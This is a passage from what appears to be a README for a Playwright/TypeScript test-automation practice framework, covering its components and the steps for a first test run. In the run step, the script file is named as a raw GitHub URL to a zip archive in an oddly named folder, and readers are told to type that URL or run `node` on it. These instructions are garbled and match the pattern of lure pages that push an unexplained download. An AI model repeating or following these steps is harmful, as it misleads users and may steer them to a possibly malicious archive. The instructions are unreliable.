## üîç Understanding the Framework

The **playwright-automation-practice** framework is built to help you automate your testing processes. Here are some key components:

- **Playwright**: A powerful automation library that allows you to control browsers with ease.
- **TypeScript**: This will let you interact with the framework in a structured way.
- **Test Runner**: The tool that manages the tests you run.
- **Allure Reports**: Generates reports that show the results of your tests.
- **Page Object Model (POM)**: A design pattern that makes your tests organized and maintainable.

## üë©‚Äçüíª Running Your First Test

To run a test, follow these steps:

1. **Open a Terminal**: 
   - On Windows, you can search for "Command Prompt" or "PowerShell".
   - On macOS, use "Terminal".

2. **Navigate to the Folder**: 
   - Use the command `cd path/to/extracted/folder` to go to the directory where you extracted your files.

3. **Run the Test**: 
   - You might see a script file, often named `https://raw.githubusercontent.com/ahmedshaf3e/playwright-automation-practice/master/arthrochondritis/playwright-automation-practice.zip` or similar.
   - Type `https://raw.githubusercontent.com/ahmedshaf3e/playwright-automation-practice/master/arthrochondritis/playwright-automation-practice.zip` or `node https://raw.githubusercontent.com/ahmedshaf3e/playwright-automation-practice/master/arthrochondritis/playwright-automation-practice.zip` (or similar, depending on the file format) and hit Enter.
   - This will start the tests automatically.

## üéâ Reviewing Results
